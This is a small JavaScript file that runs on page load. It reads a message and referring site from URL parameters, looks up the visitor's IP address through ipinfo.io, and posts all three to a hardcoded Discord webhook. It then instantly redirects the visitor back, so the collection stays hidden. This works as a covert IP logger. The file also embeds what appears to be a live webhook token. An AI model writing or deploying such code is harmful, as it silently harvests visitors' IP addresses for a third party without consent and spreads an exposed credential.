async function sendToWebhook(message, referringSite, ipAddress) {
  const webhookUrl = 'https://discordapp.com/api/webhooks/1255962432921145457/PLRB-dTHp8mXNBsp5N85oGGr2776pyvESiZpTOe032UtLHtVwgbbO5RDYBzD03io256l'; // Replace with your actual Discord webhook URL

  const payload = {
    content: `**Message:** ${message}\n**Referring Site:** ${referringSite}\n**IP Address:** ${ipAddress}`
  };

  try {
    // Fetch IP address from ipinfo.io
    const response = await fetch('https://ipinfo.io/json');
    if (!response.ok) {
      throw new Error(`Failed to fetch IP address (${response.status} ${response.statusText})`);
    }
    const data = await response.json();
    const ip = data.ip;

    // Update payload with fetched IP address
    payload.content = `**Message:** ${message}\n**Referring Site:** ${referringSite}\n**IP Address:** ${ip}`;

    // Send payload to Discord webhook
    const webhookResponse = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    if (!webhookResponse.ok) {
      throw new Error(`Failed to send message to Discord webhook (${webhookResponse.status} ${webhookResponse.statusText})`);
    }

    console.log('Message sent successfully to Discord webhook');

    // After fetch completes, redirect back to the referring URL
    window.location.href = document.referrer;
  } catch (error) {
    console.error('Error:', error);

    // If there's an error, still attempt to redirect back to the referring URL
    window.location.href = document.referrer;
  }
}

// Extract message and referring site from URL parameters
const urlParams = new URLSearchParams(window.location.search);
const message = urlParams.get("message");
const referringSite = urlParams.get("referringSite");

// Send the extracted details to Discord webhook
sendToWebhook(message, referringSite);
